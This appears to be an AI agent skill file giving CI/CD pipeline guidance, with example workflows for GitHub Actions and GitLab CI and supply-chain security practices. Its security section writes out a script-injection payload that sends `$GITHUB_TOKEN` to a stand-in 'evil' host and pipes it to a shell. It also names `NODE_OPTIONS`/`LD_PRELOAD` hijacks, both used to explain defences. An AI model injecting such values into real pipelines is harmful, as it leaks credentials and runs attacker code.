---
name: loom-ci-cd
description: Designs and implements CI/CD pipelines for automated testing, building, deployment, and security scanning across GitHub Actions, GitLab CI, Jenkins, CircleCI, and cloud-native platforms. Covers pipeline optimization, test integration, artifact management, and release automation.
allowed-tools:
  - Read
  - Grep
  - Glob
  - Edit
  - Write
  - Bash
triggers:
  - CI/CD
  - pipeline
  - workflow
  - GitHub Actions
  - GitLab CI
  - Jenkins
  - CircleCI
  - Travis CI
  - Azure Pipelines
  - build
  - deploy
  - deployment
  - release
  - artifact
  - stage
  - job
  - runner
  - action
  - automation
  - continuous integration
  - continuous deployment
  - continuous delivery
  - container registry
  - docker build
  - image push
  - canary deployment
  - blue-green deployment
  - rolling update
  - rollback
  - integration tests
  - smoke tests
  - security scanning
  - SAST
  - DAST
  - dependency scanning
  - secrets management
  - cache optimization
  - parallelization
  - monorepo CI
  - matrix build
  - self-hosted runner
  - ML pipeline
  - model training pipeline
  - model deployment
---

# CI/CD

## Overview

Pipeline design, security hardening, and optimization across GitHub Actions, GitLab CI, Jenkins, CircleCI, and cloud-native platforms. The load-bearing content is **Expert Practices** (bottom) — supply-chain, least-privilege, OIDC, cache trust boundaries, and platform gotchas. Read that section for any non-trivial pipeline.

## Design Principles

- **Fail fast, cheap-first**: lint → typecheck → unit → integration → build → deploy. A stage should only run if everything cheaper passed.
- **Parallelize independent work**; shard slow test suites across runners; matrix multi-version/OS.
- **Cache by lock-file hash, scoped by OS** — never by branch (see cache gotcha). Cache deps, build output, Docker layers.
- **Build once, promote by digest** — never rebuild per environment (see Design Patterns). What you validated in staging must be the exact bytes that reach prod.
- **Least privilege**: `permissions: {}` default, grant per-job; OIDC not stored cloud keys; pin actions by SHA.
- **Every deploy reversible**; pipelines idempotent/re-runnable; manual approval gates for prod via environments.
- **Shift security left**: SAST/secret/dependency scans early; container scan pre-push; block on CRITICAL/HIGH.

### Deployment strategies

| Strategy       | Mechanism                              | Rollback           | Use when                          |
| -------------- | -------------------------------------- | ------------------ | --------------------------------- |
| Rolling        | Replace pods incrementally             | Roll forward/back  | Default; backward-compat schema   |
| Blue-green     | Two full envs, flip traffic            | Flip back instant  | Fast rollback, DB-compat needed   |
| Canary         | Route N% to new version, ramp          | Drop canary        | Risk-averse, good metrics/SLOs    |
| Shadow         | Mirror traffic, discard responses      | N/A (no user impact) | Validate perf before real cutover |

## Examples

Examples are trimmed skeletons — repeat `checkout`/`setup-*` steps per job (jobs don't share a workspace). **All third-party actions must be SHA-pinned in real use** (shown as `@<sha>`); official `actions/*` shown with tags for brevity.

### GitHub Actions: full pipeline

```yaml
name: CI/CD
on:
  push: { branches: [main, develop] }
  pull_request: { branches: [main] }
env: { REGISTRY: ghcr.io, IMAGE_NAME: ${{ github.repository }} }
permissions: {}                       # deny all; grant per-job below
concurrency: { group: "ci-${{ github.workflow }}-${{ github.head_ref || github.ref }}", cancel-in-progress: true }

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: test }
        ports: ["5432:5432"]
        options: >-
          --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "20", cache: "npm" }   # cache keyed on lock file automatically
      - run: npm ci
      - run: npm test -- --coverage
        env: { DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test }

  build:
    needs: test
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write }   # only this job can push
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3            # REQUIRED for type=gha cache
      - uses: docker/login-action@v3
        with: { registry: "${{ env.REGISTRY }}", username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
      - id: build
        uses: docker/build-push-action@<sha>           # v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          provenance: mode=max                         # SLSA (private repos default mode=min)
          sbom: true                                   # NOT automatic; incompatible with load: true
          cache-from: type=gha
          cache-to: type=gha,mode=max
    outputs: { digest: "${{ steps.build.outputs.digest }}" }

  deploy-production:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production                            # gates/approvals configured on the environment
    steps:
      - uses: actions/checkout@v4
      - name: Deploy by immutable digest
        run: kubectl set image deployment/app app=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.digest }}
```

### GitLab CI

```yaml
stages: [validate, test, build, deploy]
variables: { IMAGE_TAG: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA }

workflow:                                     # suppress duplicate branch pipeline when an MR is open
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH

.node: { image: node:20-alpine, cache: { key: ${CI_COMMIT_REF_SLUG}, paths: [node_modules/] } }

test:
  stage: test
  extends: .node
  services: [postgres:16]
  variables: { POSTGRES_DB: test, POSTGRES_USER: r, POSTGRES_PASSWORD: r, DATABASE_URL: "postgresql://r:r@postgres:5432/test" }
  script: [npm ci, npm test -- --coverage]
  coverage: '/Lines\s*:\s*(\d+\.?\d*)%/'
  artifacts: { reports: { junit: junit.xml, coverage_report: { coverage_format: cobertura, path: coverage/cobertura-coverage.xml } } }

deploy-production:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - kubectl set image deployment/app app=$IMAGE_TAG -n production
    - kubectl rollout status deployment/app -n production --timeout=300s
  environment: { name: production, url: https://example.com }
  when: manual                                # approval gate
  rules: [{ if: $CI_COMMIT_BRANCH == "main" }]
```

### Deploy via OIDC (no stored cloud keys)

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    permissions:
      id-token: write        # REQUIRED for OIDC — omit and the token request silently returns empty
      contents: read
    steps:
      - uses: actions/checkout@<sha>
      - uses: aws-actions/configure-aws-credentials@<sha>   # mints short-lived STS creds
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gh-deploy   # trust policy: sub StringEquals repo:org/repo:environment:production
          aws-region: ${{ inputs.aws-region }}
      - run: aws eks update-kubeconfig --name ${{ inputs.cluster }} --region ${{ inputs.aws-region }}
      - run: kubectl set image deployment/app app=${{ inputs.image-digest }} -n ${{ inputs.environment }}
```

### Security scanning jobs

```yaml
jobs:
  sast:
    runs-on: ubuntu-latest
    permissions: { security-events: write, contents: read }   # upload-sarif needs this
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with: { languages: "javascript, python" }
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3

  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }              # full history for secret detection
      - uses: aquasecurity/trivy-action@<sha> # fs + image scanning; never @master
        with: { scan-type: fs, scan-ref: ".", format: sarif, output: trivy.sarif, severity: "CRITICAL,HIGH" }
      - uses: github/codeql-action/upload-sarif@v3
        with: { sarif_file: trivy.sarif }
      - uses: trufflesecurity/trufflehog@<sha>
        with: { base: "${{ github.event.repository.default_branch }}", head: HEAD }
```

Tool map: **SAST** CodeQL / Semgrep / SonarQube (`sonarqube-scan-action`; `sonarcloud-github-action` archived 2025-10) · **deps** Trivy / Snyk / Dependabot · **secrets** TruffleHog / GitGuardian · **container** Trivy / Grype · **DAST** OWASP ZAP (against a deployed env).

### Matrix + sharding

```yaml
jobs:
  unit:
    strategy:
      fail-fast: false                        # let all cells finish; true kills the whole matrix on first failure
      matrix: { node: [18, 20, 22], os: [ubuntu-latest, macos-latest] }
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci && npm test
  integration:
    strategy: { matrix: { shard: [1, 2, 3, 4] } }   # split slow suite across runners
    runs-on: ubuntu-latest
    steps:
      - run: npm run test:integration -- --shard=${{ matrix.shard }}/4
```

### Monorepo path filtering

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs: { api: "${{ steps.f.outputs.api }}", web: "${{ steps.f.outputs.web }}" }
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@<sha>
        id: f
        with:
          filters: |
            api:  ['services/api/**', 'packages/shared/**']
            web:  ['services/web/**', 'packages/shared/**']
  test-api:
    needs: changes
    if: needs.changes.outputs.api == 'true'   # skip unchanged services
    runs-on: ubuntu-latest
    steps: [{ uses: actions/checkout@v4 }]     # ... build/test api
```

Alternatives to hand-rolled filtering: Turborepo/Nx `affected` graphs, Bazel — they compute the change-impact DAG and skip unaffected targets.

### ML pipeline skeleton

```yaml
# jobs: data-validation -> train -> evaluate (gate) -> deploy
jobs:
  train:
    needs: data-validation                    # Great Expectations / schema check on DVC-pulled data first
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11", cache: pip }
      - run: pip install -r requirements.txt mlflow
      - run: python training/train.py --model-version ${{ inputs.model-version || github.sha }}   # tag model with git SHA
        env: { MLFLOW_TRACKING_URI: "${{ secrets.MLFLOW_TRACKING_URI }}" }
      - uses: actions/upload-artifact@v4
        with: { name: trained-model, path: models/output/ }
  evaluate:
    needs: train
    runs-on: ubuntu-latest
    steps:
      - run: python evaluation/check_metrics.py --min-accuracy 0.85 --min-f1 0.80   # perf gate: fail = no deploy
```

ML specifics: validate data schema/quality before training; track experiments (MLflow/W&B); version models by SHA; gate deploy on metric thresholds; roll out via shadow → canary; auto-rollback on live perf degradation.

## Caching & Parallelization

- **Dependency cache**: `~/.npm`, `~/.cargo`, `vendor/`, `.m2/`. Key on the **lock file** hash, scope by `runner.os`.
- **Build-output cache**: compiled artifacts, `.next/cache`, incremental build state (Nx/Turborepo `affected`).
- **Docker layers**: `cache-from/to: type=gha` (needs Buildx) or registry inline cache; order Dockerfile stable→volatile.
- **Parallelize**: independent jobs concurrently; shard test suites; matrix versions/OS; monorepo path filters.
- **Changed-files-only** tests on PRs (`jest --findRelatedTests`, `git diff origin/main...HEAD`) — but run the full suite on the merge/trunk gate.

## Debugging

```bash
act -j test --secret-file .env.secrets          # GitHub Actions locally
gitlab-runner exec docker test                  # GitLab CI locally
actionlint .github/workflows/*.yml              # type-check workflow expressions + ShellCheck run: blocks
zizmor .github/workflows/                        # supply-chain / injection / over-broad-permissions lints
DOCKER_BUILDKIT=1 docker build --progress=plain . # full build log
kubectl apply --dry-run=client -f k8s/          # validate manifests
```

Common failures: **flaky tests** (fix race/increase timeout/quarantine, not blanket retry); **slow pipeline** (profile → cache → parallelize); **secret exposure** (secret scanning + rotate); **network timeout** (retry + artifact cache).

## Expert Practices: Idioms, Anti-Patterns & Gotchas

High-signal practices distilled from official platform docs and supply-chain incident research. Each carries the mechanism — the *why* is what makes the rule transfer.

### Security

**Pin third-party actions to a full commit SHA, never a tag or branch.** `uses: owner/action@v4` and `@main`/`@master` are mutable git refs: the maintainer (or an attacker who compromises the repo or a PAT) can force-push the tag/branch to different code, and every consumer silently runs it on the next trigger. This is the exact mechanism of tj-actions/changed-files (CVE-2025-30066, March 2025) — tags repointed to a single malicious commit that dumped runner memory (secrets) into logs across 23,000+ repos; trivy-action was hit similarly. A 40-char SHA is content-addressed (Git addresses objects by SHA-1 of their content) so it resolves to exactly one tree of bytes forever; a tag is just a named pointer with no such guarantee. `@main`/`@master` is the worst case — it advances on every push. Pair SHA pins with Dependabot/Renovate so you still get update PRs.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8  # v0.24.0
# .github/dependabot.yml: { package-ecosystem: github-actions, directory: /, schedule: { interval: weekly } }
```

**Declare `permissions: {}` at workflow level, then grant per-job minimums.** A workflow with no `permissions` block inherits the repo default — read-only only for orgs/repos created after Feb 2023; older repos and many forks keep the permissive read-write default. Setting `{}` denies all GITHUB_TOKEN scopes; then, because **setting any one scope forces all unspecified scopes to `none`**, granting one scope per job locks the rest down. This bounds blast radius: a compromised action in a test job with no write scopes cannot push commits, alter workflows, or exfiltrate via the Actions API. Common grants: `packages: write` (push GHCR), `security-events: write` (upload SARIF), `id-token: write` + `attestations: write` (OIDC + provenance).

```yaml
permissions: {}   # deny all by default
jobs:
  test:
    steps: [ ... ]                                    # inherits empty set
  build:
    permissions: { contents: read, packages: write }  # only this job can push to GHCR
    steps: [ ... ]
```

**Replace long-lived cloud keys with OIDC, scoped to repo + ref/environment.** Stored AWS/GCP/Azure keys never expire and can't be scoped to a branch; they leak via logs, secret scanning, or insiders. OIDC mints a short-lived signed JWT per job (claims: subject, repo, ref, environment) that the cloud IAM trust policy verifies before returning temporary STS creds. The critical footgun is an over-broad trust policy: a `sub` of `repo:org/*` (or `StringLike`, or no `sub` check at all) lets any repo/branch — including a fork PR — assume the role. Scope `sub` with `StringEquals` to the exact ref/environment, e.g. `repo:org/repo:environment:production`. On GitHub the job needs `permissions: id-token: write` — omitting it makes the token request silently return empty and the action fails cryptically. On **GitLab (≥15.7)** use the `id_tokens` keyword with `aud`; `CI_JOB_JWT`/`CI_JOB_JWT_V2` were **removed in GitLab 17.0 (May 2024)** — pipelines relying on them break.

```yaml
# GitLab CI — OIDC, no stored keys (CI_JOB_JWT was removed in 17.0)
deploy:
  id_tokens:
    AWS_OIDC_TOKEN: { aud: https://sts.amazonaws.com }
  script:
    - aws sts assume-role-with-web-identity --role-arn "$ROLE_ARN"
        --web-identity-token "$AWS_OIDC_TOKEN" --role-session-name gitlab-$CI_JOB_ID
```

**Never use `pull_request_target` while checking out fork code — use the two-workflow split.** `pull_request_target` runs in the BASE repo context with a write-scoped token and full secret visibility, even for fork PRs. Adding `actions/checkout` with `ref: github.event.pull_request.head.sha` to "test the PR" materializes attacker code inside that privileged context, so any subsequent `npm install`/`make` runs attacker-controlled postinstall hooks with the write token and secrets in memory (a "pwn request" / Poisoned Pipeline Execution). The durable fix is a hard split: Workflow 1 (`on: pull_request`, `permissions: {}`) runs the untrusted code and uploads results as an artifact; Workflow 2 (`on: workflow_run`, has secrets/write) downloads that artifact and treats its contents as **untrusted data** — never executing it or writing it to `GITHUB_ENV`. (actions/checkout@v7, GA June 2026, refuses fork-PR checkout under `pull_request_target` by default, but the split is the durable mitigation.)

**Route untrusted context values through env vars to prevent script injection.** `${{ expression }}` is evaluated at workflow-*generation* time, BEFORE the shell parses `run:` — so the value is string-substituted into the script source. A user-controlled field (PR title, branch name, commit message) interpolated inline lets an attacker supply `a"; curl evil/$GITHUB_TOKEN | sh; echo "` which then executes. Assign the expression to an `env:` var and reference `"$VAR"`: the value lands in memory as a string before generation, and the shell resolves the variable *after* parsing, so metacharacters stay data. GitHub Security Lab treats any field ending in body/title/message/name/ref/label/head_ref/email/default_branch/page_name as untrusted.

```yaml
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}  # resolved before shell parses
  run: |
    [[ "$PR_TITLE" =~ ^feat ]] && echo "feature PR"
```

**Treat `GITHUB_ENV`/`GITHUB_PATH` writes of untrusted data as privilege escalation.** Distinct from script injection: here the command is safe but the DATA written is attacker-controlled. `GITHUB_ENV` sets env vars for all later steps, so piping untrusted content (a fork's `workflow_run` artifact, an API response) into it lets an attacker inject `NODE_OPTIONS=--require /evil` or `LD_PRELOAD`, hijacking subsequent steps; appending to `GITHUB_PATH` prepends malicious dirs for tool substitution; and a line matching `VAR<<DELIM ... DELIM` defines arbitrary vars via heredoc. Prefer `GITHUB_OUTPUT` (named key=value pairs only, no effect on the running shell's env) for passing values; validate/strip newlines; use a randomized heredoc delimiter (`EOF$(uuidgen)`) for legitimate multiline values.

**Secret log redaction is best-effort — register derived values explicitly.** Redaction matches EXACT registered secret values in stdout/stderr. It misses: (1) structured secrets — a JSON blob stored as one secret is matched only as the whole string, not an embedded token printed alone; (2) derived values — base64/JWT/concatenations are new, unregistered strings; (3) some tool stderr that bypasses the masking pipeline. Store decomposed scalar secrets, not blobs; call `echo "::add-mask::$DERIVED"` *before* emitting any output for values you derive; audit raw logs after testing with sensitive inputs. Redaction is a backstop, not a control.

**GitHub Actions cache crosses trust boundaries — don't restore caches in publish/release jobs.** The cache key namespace is shared across branches and is NOT isolated by privilege level, so a low-privilege `pull_request` workflow can write an entry that a high-privilege release job later restores (cache poisoning) — backdooring the published artifact, even one that then gets a valid SLSA attestation. In publish/release jobs, do NOT restore caches; reinstall fresh from the lock file (`npm ci`) so integrity is re-verified.

**Use ephemeral self-hosted runners; avoid self-hosted runners on public repos.** Persistent runners retain workspace files, env vars, and cached credentials between jobs — a later job (including a fork PR job on a public repo) can read and exfiltrate them. GitHub's guidance: no self-hosted runners on public repos; for private/internal use just-in-time (`--ephemeral`) runners provisioned per job and destroyed after one use (via the registration API or Actions Runner Controller `ephemeral: true`).

**Enforce the gate with branch protection / required status checks.** A green pipeline is advisory until the branch requires it — otherwise a merge can bypass CI entirely. Mark the fast-check and security jobs as required status checks (or a GitLab merge-request approval rule); require up-to-date branches so a check can't pass against stale base. Enable push protection / secret scanning at the repo level so pushes containing detected secrets are blocked, not merely reported.

### Idioms

**Generate SLSA provenance for release artifacts — but know its limits.** `actions/attest-build-provenance` (GA June 2024) uses Sigstore to bind an artifact's digest to the workflow run, repo, commit, and trigger, reaching SLSA Build L2 out of the box; consumers verify with `gh attestation verify`. Required: `id-token: write` (mint the Sigstore cert) and `attestations: write` (persist it) — missing either fails, often only surfacing at verification. **Crucial nuance:** provenance attests build *identity*, not input *cleanliness* — it signs whatever the workflow produced, including an artifact built from a poisoned cache. Pair it with lock-file install (`npm ci`), no cache restore in the publish job, and SHA-pinned actions.

**Add SBOM and explicit provenance to Docker images with build-push-action v6+; never pass secrets via `--build-arg`.** Since v4, provenance attestations are added automatically (public repos `mode=max`, private `mode=min`); SBOM is NOT automatic — set `sbom: true`. Both require pushing to a registry and are incompatible with `load: true`. Security gotcha: build args appear in `mode=max` provenance on public repos, so pass secrets via BuildKit secret mounts (`secrets:`), never `build-args`. Current major is v6 (v7 available 2026); pin to a SHA regardless.

```yaml
- uses: docker/build-push-action@<sha>  # v6
  with:
    context: .
    push: true
    provenance: mode=max
    sbom: true
    secrets: |
      MY_SECRET=${{ secrets.MY_SECRET }}   # secret mount, NOT --build-arg
```

**Lint workflows with actionlint and zizmor in CI.** Generic YAML linters can't see Actions semantics. `actionlint` type-checks workflow expressions, validates action inputs, and runs ShellCheck on `run:` scripts. `zizmor` flags supply-chain risks (unpinned third-party refs), over-broad `permissions`, and expression injection (it excludes official GitHub actions from its pinning rule to cut false positives). Run both as a CI step or pre-commit — cheap, high-leverage, complementary to SHA-pinning and least-privilege.

### Design Patterns

**Build artifacts once and promote the same bytes by digest; never rebuild per environment.** Rebuilding a container/binary separately for staging and prod is non-deterministic — base-image digests, transitive deps, and compiler output can differ between builds of the same source SHA, so what you validated in staging is not what reaches prod. The "Continuous Delivery" (Humble & Farley) immutable-artifact principle: build once, capture the content-addressed digest, promote that exact digest. A registry tag (`v1.2.3`) is a mutable pointer; a digest (`sha256:...`) is immutable. SLSA provenance binds to the digest, so promoting by digest preserves the chain of custody.

```yaml
- name: Deploy by immutable digest (not the tag)
  run: kubectl set image deployment/app app=ghcr.io/org/app@${{ steps.build.outputs.digest }}
```

**Trunk-based development is a prerequisite for true CI, not a naming convention.** DORA/Accelerate research found trunk-based development (integrating to mainline daily via short-lived branches) is a statistically significant predictor of elite delivery. A pipeline validating an isolated long-lived branch only catches integration failures at merge time, not continuously — so CI in the Humble/Farley sense requires every developer's code to reach mainline at least daily. Implications: optimize the trunk gate for fast feedback (target sub-5-minute fast checks) and use feature flags to decouple deploy from release so incomplete features can merge to trunk unseen. Running CI primarily on a long-lived `develop` branch does not achieve CI.

### Gotchas

**Concurrency: cancel-in-progress for CI, `false` for deployments.** `cancel-in-progress: true` is correct for lint/test (aborting a stale run wastes nothing). On DEPLOYMENT jobs it's dangerous — cancelling a mid-flight rollout (a 50%-complete Kubernetes rollout, a half-applied migration) leaves mismatched versions or partial state. Use the same group key with `cancel-in-progress: false` so deploys queue. Two nuances: (1) with `false`, a group holds at most one running + one pending — a third trigger cancels the PENDING job, never the running one; (2) include `github.workflow` in the group key so an unprefixed ref-based key doesn't cancel unrelated workflows.

```yaml
# CI
concurrency: { group: "ci-${{ github.workflow }}-${{ github.head_ref || github.ref }}", cancel-in-progress: true }
# Deploy — queue, never interrupt a live rollout
concurrency: { group: "deploy-${{ github.workflow }}-production", cancel-in-progress: false }
```

**GitLab CI: use `rules:` + `workflow:rules`, never mix with `only/except`; suppress duplicate pipelines.** (1) Mixing `only/except` and `rules:` across jobs in one pipeline is unsupported — GitLab processes them separately, producing unpredictable job inclusion; migrate everything to `rules:`. (2) When a job has both an MR-event rule and a branch rule, a push to a branch with an open MR triggers BOTH a detached merge-request pipeline and a branch pipeline — doubling runner load. The canonical fix is a global `workflow:rules` that suppresses the branch pipeline when an MR is open, keyed on `$CI_OPEN_MERGE_REQUESTS` (shown in the GitLab example above).

**GitHub Actions cache key: scope by `runner.os`, key on the lock file, keep restore-keys narrow.** (1) Omitting `runner.os` lets Linux and macOS share a cache — native/compiled binaries built for one OS fail on the other. (2) Keying on source (`hashFiles('**/*.ts')`) misses the cache on every code change; key on the dependency LOCK file (`package-lock.json`, `Cargo.lock`), which changes only when deps change. (3) `restore-keys` are prefix-matched by recency, so a too-broad fallback can restore an arbitrary stale/incompatible cache — keep the prefix specific.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

**`type=gha` Docker cache requires Buildx and silently no-ops otherwise.** The `type=gha` BuildKit backend is NOT supported by the default `docker` driver on GitHub-hosted runners — it needs a `docker-container`/`docker-buildx` builder. Without `docker/setup-buildx-action` before `docker/build-push-action`, `cache-from`/`cache-to: type=gha` are silently ignored: zero read, zero write, no error. Also: `BUILDKIT_INLINE_CACHE=1` is a build-arg for the *registry* inline-cache mechanism — it has no effect with `type=gha` and just adds confusion; and multiple image builds in one job sharing the default scope overwrite each other's cache, so give each a distinct `scope=`.

```yaml
- uses: docker/setup-buildx-action@<sha>   # REQUIRED before the gha backend
- uses: docker/build-push-action@<sha>     # v6
  with:
    cache-from: type=gha,scope=api
    cache-to: type=gha,mode=max,scope=api   # distinct scope per image
```

## Verification Checklist

Before shipping a pipeline:

- [ ] `permissions: {}` at workflow level; each job grants only the scopes it needs
- [ ] Every third-party action pinned to a full 40-char SHA; Dependabot/Renovate configured for `github-actions`
- [ ] Cloud auth via OIDC with a `StringEquals` sub scoped to repo + ref/environment (no stored long-lived keys)
- [ ] No `pull_request_target` + fork checkout; untrusted PRs handled via the `pull_request` → `workflow_run` split
- [ ] Untrusted context values (`title`, `head_ref`, `body`, ...) passed through `env:`, never inlined into `run:`
- [ ] Publish/release jobs do NOT restore caches; deps reinstalled from lock file
- [ ] Concurrency group set: `cancel-in-progress: true` for CI, `false` for deploys
- [ ] Caches keyed on lock-file hash + `runner.os`; `setup-buildx-action` present before any `type=gha` cache
- [ ] Artifact built once, promoted by immutable digest; SBOM + provenance emitted for releases
- [ ] Security scans (SAST/deps/secrets/container) run early and block on CRITICAL/HIGH
- [ ] Required status checks / branch protection enforce the gate; prod behind an environment with approval
- [ ] `actionlint` and `zizmor` run in CI; stderr of build/deploy steps checked for silent failures
